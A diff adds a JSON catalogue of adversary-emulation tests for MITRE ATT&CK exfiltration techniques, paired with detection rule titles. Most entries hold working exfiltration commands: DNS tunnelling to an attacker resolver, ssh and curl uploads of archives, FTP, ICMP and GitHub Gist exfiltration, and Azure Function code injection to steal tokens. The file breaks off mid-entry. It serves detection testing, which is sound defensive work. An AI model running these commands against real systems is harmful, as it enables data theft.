@@ -1,0 +1,699 @@
+{
+  "tactic_id": "TA0010",
+  "tactic_name": "exfiltration",
+  "techniques": [
+    {
+      "technique_id": "T1020",
+      "name": "Automated Exfiltration",
+      "description": "Creates a text file\nTries to upload to a server via HTTP PUT method with ContentType Header\nDeletes a created file",
+      "platforms": [
+        "windows"
+      ],
+      "commands": [
+        {
+          "executor": "powershell",
+          "command": "$fileName = \"#{file}\"\n$url = \"#{domain}\"\n$file = New-Item -Force $fileName -Value \"This is ART IcedID Botnet Exfil Test\"\n$contentType = \"application/octet-stream\"\ntry {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}",
+          "cleanup": "$fileName = \"#{file}\"\nRemove-Item -Path $fileName -ErrorAction Ignore"
+        },
+        {
+          "executor": "powershell",
+          "command": "$sampleData = \"Sample data for exfiltration test\"\nSet-Content -Path \"#{sampleFile}\" -Value $sampleData\n$ftpUrl = \"#{ftpServer}\"\n$creds = Get-Credential -Credential \"#{credentials}\"\nInvoke-WebRequest -Uri $ftpUrl -Method Put -InFile \"#{sampleFile}\" -Credential $creds",
+          "cleanup": "Remove-Item -Path \"#{sampleFile}\" -ErrorAction Ignore"
+        }
+      ],
+      "detection_rules": [
+        {
+          "title": "PowerShell Script With File Hostname Resolving Capabilities",
+          "logsource": {
+            "product": "windows",
+            "category": "ps_script",
+            "definition": "bade5735-5ab0-4aa7-a642-a11be0e40872"
+          },
+          "description": "Detects PowerShell scripts that have capabilities to read files, loop through them and resolve DNS host entries."
+        },
+        {
+          "title": "PowerShell Script With File Upload Capabilities",
+          "logsource": {
+            "product": "windows",
+            "category": "ps_script",
+            "definition": "bade5735-5ab0-4aa7-a642-a11be0e40872"
+          },
+          "description": "Detects PowerShell scripts leveraging the \"Invoke-WebRequest\" cmdlet to send data via either \"PUT\" or \"POST\" method."
+        }
+      ]
+    },
+    {
+      "technique_id": "T1025",
+      "name": "Data from Removable Media",
+      "description": "This test simulates an attack where PowerShell is used to detect connected USB or other removable storage devices and gather a list of specific document files \n(e.g., .docx, .xls, .txt, .pdf). The command works by first identifying removable drives on the system and then recursively searching through each one for files \nmatching the targeted extensions. If no removable drives are present, the script will return a message stating that no media is detected. This behavior mimics \nhow adversaries might scan for sensitive documents on removable devices for exfiltration or analysis.",
+      "platforms": [
+        "windows"
+      ],
+      "commands": [
+        {
+          "executor": "command_prompt",
+          "command": "powershell.exe -c \"Get-Volume | Where-Object {$_.DriveType -eq 'Removable'} | ForEach-Object { Get-ChildItem -Path ($_.DriveLetter + ':\\*') -Recurse -Include '*.doc*','*.xls*','*.txt','*.pdf' -ErrorAction SilentlyContinue | ForEach-Object {Write-Output $_.FullName} } ; if (-not (Get-Volume | Where-Object {$_.DriveType -eq 'Removable'})) { Write-Output 'No removable media.' }\"",
+          "cleanup": null
+        },
+        {
+          "executor": "psh",
+          "command": "Get-Volume | Where-Object {\n  $_.DriveType -eq 'Removable'\n} | ForEach-Object {\n  Get-ChildItem -Path ($_.DriveLetter + ':\\*') -Recurse -Include '*.doc*','*.xls*','*.txt','*.pdf' -ErrorAction SilentlyContinue | ForEach-Object {\n    Write-Output $_.FullName\n  } \n};\nif (-not (Get-Volume | Where-Object {$_.DriveType -eq 'Removable'})) {\n  Write-Output 'No removable media.'\n}",
+          "cleanup": null
+        }
+      ],
+      "detection_rules": []
+    },
+    {
+      "technique_id": "T1041",
+      "name": "Exfiltration Over C2 Channel",
+      "description": "Exfiltrates a file present on the victim machine to the C2 server.",
+      "platforms": [
+        "windows",
+        "darwin",
+        "linux"
+      ],
+      "commands": [
+        {
+          "executor": "powershell",
+          "command": "if(-not (Test-Path #{filepath})){ \n  1..100 | ForEach-Object { Add-Content -Path #{filepath} -Value \"This is line $_.\" }\n}\n[System.Net.ServicePointManager]::Expect100Continue = $false\n$filecontent = Get-Content -Path #{filepath}\nInvoke-WebRequest -Uri #{destination_url} -Method POST -Body $filecontent -DisableKeepAlive",
+          "cleanup": null
+        },
+        {
+          "executor": "powershell",
+          "command": "$dnsServer = \"#{dns_server}\"\n$exfiltratedData = \"#{exfiltrated_data}\"\n$chunkSize = #{chunk_size}\n\n$encodedData = [System.Text.Encoding]::UTF8.GetBytes($exfiltratedData)\n$encodedData = [Convert]::ToBase64String($encodedData)\n$chunks = $encodedData -split \"(.{$chunkSize})\"\n\nforeach ($chunk in $chunks) {\n    $dnsQuery = $chunk + \".\" + $dnsServer\n    Resolve-DnsName -Name $dnsQuery\n    Start-Sleep -Seconds 5\n}",
+          "cleanup": null
+        },
+        {
+          "executor": "sh",
+          "command": "curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload",
+          "cleanup": null
+        },
+        {
+          "executor": "psh,pwsh",
+          "command": "$ErrorActionPreference = 'Stop';\n$fieldName = \"#{host.dir.compress}\";\n$filePath = \"#{host.dir.compress}\";\n$url = \"#{server}/file/upload\";\n\nAdd-Type -AssemblyName 'System.Net.Http';\n\n$client = New-Object System.Net.Http.HttpClient;\n$content = New-Object System.Net.Http.MultipartFormDataContent;\n$fileStream = [System.IO.File]::OpenRead($filePath);\n$fileName = [System.IO.Path]::GetFileName($filePath);\n$fileContent = New-Object System.Net.Http.StreamContent($fileStream);\n$content.Add($fileContent, $fieldName, $fileName);\n$client.DefaultRequestHeaders.Add(\"X-Request-Id\", $env:COMPUTERNAME + '-#{paw}');\n$client.DefaultRequestHeaders.Add(\"User-Agent\",\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\");\n\n$result = $client.PostAsync($url, $content).Result;\n$result.EnsureSuccessStatusCode();",
+          "cleanup": null
+        }
+      ],
+      "detection_rules": [
+        {
+          "title": "Network Communication Initiated To Portmap.IO Domain",
+          "logsource": {
+            "category": "network_connection",
+            "product": "windows"
+          },
+          "description": "Detects an executable accessing the portmap.io domain, which could be a sign of forbidden C2 traffic or data exfiltration by malicious actors"
+        }
+      ]
+    },
+    {
+      "technique_id": "T1048",
+      "name": "Exfiltration Over Alternative Protocol",
+      "description": "Input a domain and test Exfiltration over SSH\n\nRemote to Local\n\nUpon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.",
+      "platforms": [
+        "macos",
+        "linux",
+        "windows"
+      ],
+      "commands": [
+        {
+          "executor": "sh",
+          "command": "ssh #{domain} \"(cd /etc && tar -zcvf - *)\" > ./etc.tar.gz",
+          "cleanup": null
+        },
+        {
+          "executor": "sh",
+          "command": "tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@#{domain} 'cat > /Users.tar.gz.enc'",
+          "cleanup": null
+        },
+        {
+          "executor": "powershell",
+          "command": "Import-Module \"#{ps_module}\"\nInvoke-DNSExfiltrator -i \"#{ps_module}\" -d #{domain} -p #{password} -doh #{doh} -t #{time} #{encoding}",
+          "cleanup": null
+        },
+        {
+          "executor": "bash",
+          "command": "dig @#{attacker_dns_server} -p #{dns_port} $(echo \"#{secret_info}\" | base64).google.com",
+          "cleanup": null
+        }
+      ],
+      "detection_rules": [
+        {
+          "title": "Tap Driver Installation - Security",
+          "logsource": {
+            "product": "windows",
+            "service": "security",
+            "definition": "Requirements: The System Security Extension audit subcategory need to be enabled to log the EID 4697"
+          },
+          "description": "Detects the installation of a well-known TAP driver service. This could be a sign of potential preparation for data exfiltration using tunnelling techniques."
+        },
+        {
+          "title": "Tap Driver Installation",
+          "logsource": {
+            "product": "windows",
+            "service": "system"
+          },
+          "description": "Well-known TAP software installation. Possible preparation for data exfiltration using tunnelling techniques"
+        },
+        {
+          "title": "Powershell DNSExfiltration",
+          "logsource": {
+            "product": "windows",
+            "category": "ps_script",
+            "definition": "Requirements: Script Block Logging must be enabled"
+          },
+          "description": "DNSExfiltrator allows for transferring (exfiltrate) a file over a DNS request covert channel"
+        },
+        {
+          "title": "Data Export From MSSQL Table Via BCP.EXE",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects the execution of the BCP utility in order to export data from the database.\nAttackers were seen saving their malware to a database column or table and then later extracting it via \"bcp.exe\" into a file."
+        },
+        {
+          "title": "PUA - Restic Backup Tool Execution",
+          "logsource": {
+            "product": "windows",
+            "category": "process_creation"
+          },
+          "description": "Detects the execution of the Restic backup tool, which can be used for data exfiltration.\nThreat actors may leverage Restic to back up and exfiltrate sensitive data to remote storage locations, including cloud services.\nIf not legitimately used in the enterprise environment, its presence may indicate malicious activity."
+        },
+        {
+          "title": "Copy From Or To Admin Share Or Sysvol Folder",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects a copy command or a copy utility execution to or from an Admin share or remote"
+        },
+        {
+          "title": "Suspicious Redirection to Local Admin Share",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects a suspicious output redirection to the local admins share, this technique is often found in malicious scripts or hacktool stagers"
+        },
+        {
+          "title": "Tap Installer Execution",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Well-known TAP software installation. Possible preparation for data exfiltration using tunneling techniques"
+        }
+      ]
+    },
+    {
+      "technique_id": "T1048.001",
+      "name": "T1048.001",
+      "description": "",
+      "platforms": [],
+      "commands": [],
+      "detection_rules": [
+        {
+          "title": "DNS Exfiltration and Tunneling Tools Execution",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Well-known DNS Exfiltration tools execution"
+        }
+      ]
+    },
+    {
+      "technique_id": "T1048.002",
+      "name": "Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
+      "description": "Exfiltrate data HTTPS using curl to file share site file.io",
+      "platforms": [
+        "windows",
+        "macos",
+        "linux"
+      ],
+      "commands": [
+        {
+          "executor": "command_prompt",
+          "command": "#{curl_path} -k -F \"file=@#{input_file}\" https://file.io/",
+          "cleanup": null
+        },
+        {
+          "executor": "bash",
+          "command": "curl -F 'file=@#{input_file}' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/",
+          "cleanup": null
+        },
+        {
+          "executor": "sh",
+          "command": "wget --post-file=\"#{input_file}\" --timeout=5 --no-check-certificate #{endpoint_domain} --delete-after",
+          "cleanup": null
+        },
+        {
+          "executor": "sh",
+          "command": "wget --post-data=\"msg=AtomicTestT1048.002\" --timeout=5 --no-check-certificate #{endpoint_domain} --delete-after",
+          "cleanup": null
+        }
+      ],
+      "detection_rules": []
+    },
+    {
+      "technique_id": "T1048.003",
+      "name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
+      "description": "A firewall rule (ipfw,pf,iptables or firewalld) will be needed to allow exfiltration on port 1337.\n\nUpon successful execution, sh will be used to make a directory (/tmp/victim-staging-area), write a txt file, and host the directory with Python on port 1337, to be later downloaded.",
+      "platforms": [
+        "macos",
+        "linux",
+        "windows"
+      ],
+      "commands": [
+        {
+          "executor": "powershell",
+          "command": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send(\"#{ip_address}\", 1500, $Data) }",
+          "cleanup": null
+        },
+        {
+          "executor": "powershell",
+          "command": "$content = Get-Content #{input_file}\nInvoke-WebRequest -Uri #{ip_address} -Method POST -Body $content",
+          "cleanup": null
+        },
+        {
+          "executor": "powershell",
+          "command": "Send-MailMessage -From #{sender} -To #{receiver} -Subject \"T1048.003 Atomic Test\" -Attachments #{input_file} -SmtpServer #{smtp_server}",
+          "cleanup": null
+        },
+        {
+          "executor": "powershell",
+          "command": "$Dir_to_copy = \"$env:windir\\temp\"\n$ftp = \"ftp://#{ftp_server}/\"\n$web_client = New-Object System.Net.WebClient\n$web_client.Credentials = New-Object System.Net.NetworkCredential('#{username}', '#{password}')\nif (test-connection -count 1 -computername \"#{ftp_server}\" -quiet)\n{foreach($file in (dir $Dir_to_copy \"*.7z\"))\n{echo \"Uploading $file...\"\n$uri = New-Object System.Uri($ftp+$file.name)\n$web_client.UploadFile($uri, $file.FullName)}}\nelse\n{echo \"FTP Server Unreachable. Please verify the server address in input args and try again.\"}",
+          "cleanup": "$ftp = \"ftp://#{ftp_server}/\"\ntry {foreach ($file in (dir \"$env:windir\\temp\" \"*.7z\"))\n{$uri = New-Object System.Uri($ftp+$file.name)\n $ftp_del = [System.Net.FtpWebRequest]::create($uri)\n $ftp_del.Credentials = New-Object System.Net.NetworkCredential('#{username}','#{password}')\n $ftp_del.Method = [System.Net.WebRequestMethods+Ftp]::DeleteFile\n $ftp_del.GetResponse()}} catch{}"
+        },
+        {
+          "executor": "powershell",
+          "command": "$rclone_bin = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"rclone.exe\" | Select-Object -ExpandProperty FullName\n$exfil_pack = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"exfil.zip\" | Select-Object -ExpandProperty FullName\n&$rclone_bin config create ftpserver \"ftp\" \"host\" #{ftp_server} \"port\" #{ftp_port} \"user\" #{ftp_user} \"pass\" #{ftp_pass}\n&$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate",
+          "cleanup": null
+        },
+        {
+          "executor": "sh",
+          "command": "[ \"$(uname)\" = 'FreeBSD' ] && alias python3=python3.9\nif [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi",
+          "cleanup": null
+        },
+        {
+          "executor": "sh",
+          "command": "LocalFile='#{host.dir.compress}';\nRemoteName=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)\";\ncurl -T #{host.dir.compress} ftp://#{ftp.server.address}/$RemoteName --user #{ftp.user.name}:'#{ftp.user.password}'",
+          "cleanup": null
+        },
+        {
+          "executor": "psh",
+          "command": "$SourceFile = (Get-Item #{host.dir.compress});\n$RemoteName = \"$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($SourceFile.name)\";\n$ftp = [System.Net.FtpWebRequest]::Create(\"ftp://#{ftp.server.address}/$RemoteName\");\n$ftp = [System.Net.FTPWebRequest]$ftp;\n$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile;\n$ftp.Credentials = New-Object System.Net.NetworkCredential(\"#{ftp.user.name}\", \"#{ftp.user.password}\");\n$ftp.UseBinary = $true;\n$ftp.UsePassive = $true;\n\n$content = [System.IO.File]::ReadAllBytes(\"#{host.dir.compress}\");\n$ftp.ContentLength = $content.Length;\n$requestStream = $ftp.GetRequestStream();\n$requestStream.Write($content, 0, $content.Length);\n\n$requestStream.Close();\n$requestStream.Dispose();",
+          "cleanup": null
+        }
+      ],
+      "detection_rules": [
+        {
+          "title": "Suspicious Outbound SMTP Connections",
+          "logsource": {
+            "category": "network_connection",
+            "product": "windows"
+          },
+          "description": "Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel.\nThe data may also be sent to an alternate network location from the main command and control server."
+        },
+        {
+          "title": "PowerShell ICMP Exfiltration",
+          "logsource": {
+            "product": "windows",
+            "category": "ps_script",
+            "definition": "Requirements: Script Block Logging must be enabled"
+          },
+          "description": "Detects Exfiltration Over Alternative Protocol - ICMP. Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel."
+        },
+        {
+          "title": "WebDav Client Execution Via Rundll32.EXE",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects \"svchost.exe\" spawning \"rundll32.exe\" with command arguments like \"C:\\windows\\system32\\davclnt.dll,DavSetCookie\".\nThis could be an indicator of exfiltration or use of WebDav to launch code (hosted on a WebDav server)."
+        },
+        {
+          "title": "Suspicious WebDav Client Execution Via Rundll32.EXE",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects \"svchost.exe\" spawning \"rundll32.exe\" with command arguments like C:\\windows\\system32\\davclnt.dll,DavSetCookie. This could be an indicator of exfiltration or use of WebDav to launch code (hosted on WebDav Server) or potentially a sign of exploitation of CVE-2023-23397"
+        }
+      ]
+    },
+    {
+      "technique_id": "T1528",
+      "name": "Steal Application Access Token",
+      "description": "This test injects code into an Azure Function (RCE).\n\nAttack idea/reference: https://orca.security/resources/blog/azure-shared-key-authorization-exploitation/\n\nSimilar to T1528 \"Azure - Functions code upload - Functions code injection to retrieve the Functions identity access token\", the depicted code injection scenario tampers the source code of Azure Functions to perform Subscription Privilege Escalation by retrieving the identity access token of an Azure functions instance. In this case, the prepared zip file (underlying package for a Function) is expected to contain the tampered function presented in src/code_to_insert.py. Note that the endpoint https://changeme.net needs to be adapted in your packed function code.\n\nNote:\n- The Azure Function modified in this test must be hosted via Azure Blob storage (Info on storage considerations for Azure Function: https://learn.microsoft.com/en-us/azure/azure-functions/storage-considerations). \n- For Function code upload to Azure Functions that are hosted via Azure Files in a File Share, refer to T1528 \"Azure - Functions code upload - Functions code injection to retrieve the Functions identity access token\".\n- The required input fields can be retrieved in a reconnaissance step in test T1619 \"Azure - Enumerate Storage Account Objects via Key-based authentication using Azure CLI\". The code of function apps may be inspected and prepared from the result of test T1530 \"Azure - Dump Azure Storage Account Objects via Azure CLI\".\n\nRequirements:\n- The test is intended to be executed in interactive mode (with -Interactive parameter) in order to complete the az login command when MFA is required.\n- The EntraID user must have the role \"Storage Account Contributor\", or a role with similar permissions.",
+      "platforms": [
+        "iaas:azure"
+      ],
+      "commands": [
+        {
+          "executor": "powershell",
+          "command": "az login    # Log in to Azure CLI\n\n$allowSharedKeyAccess = az storage account show --name \"#{storage_account_name}\" --query \"allowSharedKeyAccess\"\n\nif ($allowSharedKeyAccess -eq \"false\") {    # $allowSharedKeyAccess could be true or null\n    Write-Output \"Shared key access is disabled for this storage account.\"\n} else {    \n    $connectionString = az storage account show-connection-string --name \"#{storage_account_name}\" --query connectionString --output tsv\n\n    # Download blob for cleanup\n    $tmpOriginalFunctionCode = Join-Path $env:temp/ (\"T1528_tmp_original_\" + \"#{blob_name}\")\n    az storage blob download --connection-string $connectionString --container-name \"#{container_name}\" --name \"#{blob_name}\" --file $tmpOriginalFunctionCode --overwrite true\n\n    if ($LASTEXITCODE -eq 0) {\n        # Upload new blob version if download of existing blob succeeded\n        az storage blob upload --connection-string $connectionString --container-name \"#{container_name}\" --name \"#{blob_name}\" --file \"#{file_path_blob}\" --overwrite true\n    } else {\n        Write-Output \"Download original function code failed.\"\n        exit 1\n    }\n}",
+          "cleanup": "az login    # Log in to Azure CLI\n\n# Upload previous funciton code\n$tmpOriginalFunctionCode = Join-Path $env:temp/ (\"T1528_tmp_original_\" + \"#{blob_name}\")\naz storage blob upload --account-name \"#{storage_account_name}\" --container-name \"#{container_name}\" --file $tmpOriginalFunctionCode --name \"#{blob_name}\" --overwrite true 2>$null\n\nif ($LASTEXITCODE -eq 0) {\n    Write-Output \"Uploaded original version of function code.\"\n\n    # Delete tmp original blob file if upload succeeded\n    Remove-Item -Path $tmpOriginalFunctionCode -Force -erroraction silentlycontinue\n    Write-Output \"Deleted tmp original blob file: $($tmpOriginalFunctionCode)\"\n} else {\n    Write-Output \"Upload original function code failed.\"\n}"
+        },
+        {
+          "executor": "powershell",
+          "command": "az login    # Log in to Azure CLI\n\n$allowSharedKeyAccess = az storage account show --name \"#{storage_account_name}\" --query \"allowSharedKeyAccess\"\n\nif ($allowSharedKeyAccess -eq \"false\") {    # $allowSharedKeyAccess could be true or null\n    Write-Output \"Shared key access is disabled for this storage account.\"\n} else {\n    # Download file for cleanup\n    $tmpOriginalFileName = [System.IO.Path]::GetFileName(\"#{file_path}\")\n    $tmpOriginalFunctionCode = Join-Path $env:temp/ (\"T1528_tmp_original_\" + $tmpOriginalFileName)\n    az storage file download --account-name \"#{storage_account_name}\" --share-name \"#{file_share_name}\" -p \"#{file_path}\" --only-show-errors --dest $tmpOriginalFunctionCode\n\n    if ($LASTEXITCODE -eq 0) {\n        # Upload new funciton code if download of existing code succeeded\n        if (\"#{execution_option}\" -eq \"insert_code\") {\n            # Download file from file share for injection\n            $tmpFunctionCode = Join-Path $env:temp/ (\"T1528_tmp_to_inject_\" + $tmpOriginalFileName)\n            az storage file download --account-name \"#{storage_account_name}\" --share-name \"#{file_share_name}\" -p \"#{file_path}\" --only-show-errors --dest $tmpFunctionCode\n            \n            if ($LASTEXITCODE -ne 0) {\n                Write-Output \"Function code download failed.\"\n                exit 1\n            }\n            Write-Output \"File downloaded: $($tmpFunctionCode)\"\n            \n            $insertContent = Get-Content -Path \"#{code_to_insert_path}\" -Raw  # Load the content of the insert file\n            \n            $content = Get-Content -Path $tmpFunctionCode -Raw  # Inject code to file\n            $content = $insertContent + \"`n\" + $content     # Insert the new code at the beginning\n            $content | Set-Content -Path $tmpFunctionCode       # Write the modified content to the file\n            \n            # Upload file to file share\n            az storage file upload --account-name \"#{storage_account_name}\" --share-name \"#{file_share_name}\" -p \"#{file_path}\" --source $tmpFunctionCode --only-show-errors\n            if ($LASTEXITCODE -ne 0) {\n                Write-Output \"Function code upload failed.\"\n                exit 1\n            }\n            Write-Output \"Uploaded the tampered file\"\n        } elseif (\"#{execution_option}\" -eq \"replace_file\") {\n            az storage file upload --account-name \"#{storage_account_name}\" --share-name \"#{file_share_name}\" -p \"#{file_path}\" --source \"#{code_to_insert_path}\" --only-show-errors\n            if ($LASTEXITCODE -ne 0) {\n                Write-Output \"Function code upload failed.\"\n                exit 1\n            }\n            Write-Output \"Uploaded the tampered file\"\n        } else {\n            Write-Output \"Please choose a valid execution_option\"\n            exit 1\n        }\n    } else {\n        Write-Output \"Download original function code failed.\"\n        exit 1\n    }\n}",
+          "cleanup": "az login    # Log in to Azure CLI\n\n# Upload previous funciton code\n$tmpOriginalFileName = [System.IO.Path]::GetFileName(\"#{file_path}\")\n$tmpOriginalFunctionCode = Join-Path $env:temp/ (\"T1528_tmp_original_\" + $tmpOriginalFileName)\naz storage file upload --account-name \"#{storage_account_name}\" --share-name \"#{file_share_name}\" -p \"#{file_path}\" --source $tmpOriginalFunctionCode --only-show-errors 2>$null\n\nif ($LASTEXITCODE -eq 0) {\n    Write-Output \"Uploaded original version of function code.\"\n\n    # Delete tmp original f file if upload succeeded\n    if (\"#{execution_option}\" -eq \"insert_code\") {\n        $tmpFunctionCode = Join-Path $env:temp/ (\"T1528_tmp_to_inject_\" + $tmpOriginalFileName)\n        Remove-Item -Path $tmpFunctionCode -Force -erroraction silentlycontinue\n        Write-Output \"Deleted tmp file: $($tmpFunctionCode)\"\n    }\n\n    # Delete tmp original file\n    Remove-Item -Path $tmpOriginalFunctionCode -Force -erroraction silentlycontinue\n    Write-Output \"Deleted tmp original file: $($tmpOriginalFunctionCode)\"\n} else {\n    Write-Output \"Upload original function code failed.\"\n}"
+        }
+      ],
+      "detection_rules": [
+        {
+          "title": "Suspicious Teams Application Related ObjectAcess Event",
+          "logsource": {
+            "product": "windows",
+            "service": "security"
+          },
+          "description": "Detects an access to authentication tokens and accounts of Microsoft Teams desktop application."
+        },
+        {
+          "title": "Microsoft Teams Sensitive File Access By Uncommon Applications",
+          "logsource": {
+            "product": "windows",
+            "category": "file_access",
+            "definition": "Requirements: Microsoft-Windows-Kernel-File ETW provider"
+          },
+          "description": "Detects file access attempts to sensitive Microsoft teams files (leveldb, cookies) by an uncommon process."
+        },
+        {
+          "title": "HackTool - Koh Default Named Pipe",
+          "logsource": {
+            "product": "windows",
+            "category": "pipe_created",
+            "definition": "Note that you have to configure logging for Named Pipe Events in Sysmon config (Event ID 17 and Event ID 18). The basic configuration is in popular sysmon configuration (https://github.com/SwiftOnSecurity/sysmon-config), but it is worth verifying. You can also use other repo, e.g. https://github.com/Neo23x0/sysmon-config, https://github.com/olafhartong/sysmon-modular. How to test detection? You can check powershell script from this site https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575"
+          },
+          "description": "Detects creation of default named pipes used by the Koh tool"
+        },
+        {
+          "title": "Renamed BrowserCore.EXE Execution",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects process creation with a renamed BrowserCore.exe (used to extract Azure tokens)"
+        },
+        {
+          "title": "Potentially Suspicious JWT Token Search Via CLI",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects potentially suspicious search for JWT tokens via CLI by looking for the string \"eyJ0eX\" or \"eyJhbG\".\nJWT tokens are often used for access-tokens across various applications and services like Microsoft 365, Azure, AWS, Google Cloud, and others.\nThreat actors may search for these tokens to steal them for lateral movement or privilege escalation."
+        },
+        {
+          "title": "Potentially Suspicious Command Targeting Teams Sensitive Files",
+          "logsource": {
+            "product": "windows",
+            "category": "process_creation"
+          },
+          "description": "Detects a commandline containing references to the Microsoft Teams database or cookies files from a process other than Teams.\nThe database might contain authentication tokens and other sensitive information about the logged in accounts."
+        }
+      ]
+    },
+    {
+      "technique_id": "T1567",
+      "name": "T1567",
+      "description": "",
+      "platforms": [],
+      "commands": [],
+      "detection_rules": [
+        {
+          "title": "Network Connection Initiated To BTunnels Domains",
+          "logsource": {
+            "category": "network_connection",
+            "product": "windows"
+          },
+          "description": "Detects network connections to BTunnels domains initiated by a process on the system.\nAttackers can abuse that feature to establish a reverse shell or persistence on a machine."
+        },
+        {
+          "title": "Network Connection Initiated To Cloudflared Tunnels Domains",
+          "logsource": {
+            "category": "network_connection",
+            "product": "windows"
+          },
+          "description": "Detects network connections to Cloudflared tunnels domains initiated by a process on the system.\nAttackers can abuse that feature to establish a reverse shell or persistence on a machine."
+        },
+        {
+          "title": "Process Initiated Network Connection To Ngrok Domain",
+          "logsource": {
+            "category": "network_connection",
+            "product": "windows"
+          },
+          "description": "Detects an executable initiating a network connection to \"ngrok\" domains.\nAttackers were seen using this \"ngrok\" in order to store their second stage payloads and malware.\nWhile communication with such domains can be legitimate, often times is a sign of either data exfiltration by malicious actors or additional download."
+        },
+        {
+          "title": "Communication To Ngrok Tunneling Service Initiated",
+          "logsource": {
+            "category": "network_connection",
+            "product": "windows"
+          },
+          "description": "Detects an executable initiating a network connection to \"ngrok\" tunneling domains.\nAttackers were seen using this \"ngrok\" in order to store their second stage payloads and malware.\nWhile communication with such domains can be legitimate, often times is a sign of either data exfiltration by malicious actors or additional download."
+        },
+        {
+          "title": "Suspicious Non-Browser Network Communication With Telegram API",
+          "logsource": {
+            "product": "windows",
+            "category": "network_connection"
+          },
+          "description": "Detects an a non-browser process interacting with the Telegram API which could indicate use of a covert C2"
+        },
+        {
+          "title": "Network Connection Initiated To Visual Studio Code Tunnels Domain",
+          "logsource": {
+            "category": "network_connection",
+            "product": "windows"
+          },
+          "description": "Detects network connections to Visual Studio Code tunnel domains initiated by a process on a system. Attackers can abuse that feature to establish a reverse shell or persistence on a machine."
+        },
+        {
+          "title": "Arbitrary File Download Via ConfigSecurityPolicy.EXE",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects the execution of \"ConfigSecurityPolicy.EXE\", a binary part of Windows Defender used to manage settings in Windows Defender.\nUsers can configure different pilot collections for each of the co-management workloads.\nIt can be abused by attackers in order to upload or download files."
+        },
+        {
+          "title": "LOLBAS Data Exfiltration by DataSvcUtil.exe",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects when a user performs data exfiltration by using DataSvcUtil.exe"
+        }
+      ]
+    },
+    {
+      "technique_id": "T1567.001",
+      "name": "Exfiltration Over Web Service: Exfiltration to Code Repository",
+      "description": "This ability exfiltrates a compressed archive to Github Gists (Base64 Encoded). To reconstitute, save\nthe base64 string from the Gist and run ----\n(Powershell) [Convert]::FromBase64String($(Get-Content b64.txt)) | set-content archive.extension -encoding byte ----\n(Linux) cat b64.txt | base64 -d > archive.extension",
+      "platforms": [
+        "linux",
+        "windows"
+      ],
+      "commands": [
+        {
+          "executor": "sh",
+          "command": "GHUser=\"#{github.user.name}\";\nGHPAT=\"#{github.access.token}\";\nFileContent=$(base64 #{host.dir.compress});\nLocalFile='#{host.dir.compress}';\nRemoteFile=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)\";\ntmp_file=$(mktemp);\necho \"{\\\"public\\\": false,\\\"files\\\": {\\\"$RemoteFile\\\": {\\\"content\\\": \\\"${FileContent}\\\"}}}\" > $tmp_file;\ncurl --silent --output /dev/null --show-error --fail -X POST -d @$tmp_file -u $GHUser:$GHPAT https://api.github.com/gists;\nrm $tmp_file",
+          "cleanup": null
+        },
+        {
+          "executor": "psh",
+          "command": "$GHUser = \"#{github.user.name}\";\n$GHPAT = \"#{github.access.token}\";\n$File = Get-Item -Path \"#{host.dir.compress}\";\n$Token = $GHUser + \":\" + $GHPAT;\n$EncodedToken = [System.Convert]::ToBase64String([char[]]$Token);\n\n$RemoteName = \"$(Get-Date -Format yyyymmddhhmmss)-exfil-paw-$($File.name)\";\n$FileContent = [Convert]::ToBase64String([IO.File]::ReadAllBytes($File));\n\n$StringContent = @{\n    files = @{$RemoteName = @{content = $FileContent}};\n    public = $False;\n} | ConvertTo-Json;\n$URL = \"https://api.github.com/gists\";\n$Body = $StringContent;\n$Headers = @{\n    \"content-type\" = \"application/json\";\n    \"Authorization\" = 'Basic {0}' -f $EncodedToken;\n};\nInvoke-WebRequest -Uri $URL -Method POST -Body $Body -Headers $Headers 1>$null -UseBasicParsing;",
+          "cleanup": null
+        },
+        {
+          "executor": "sh",
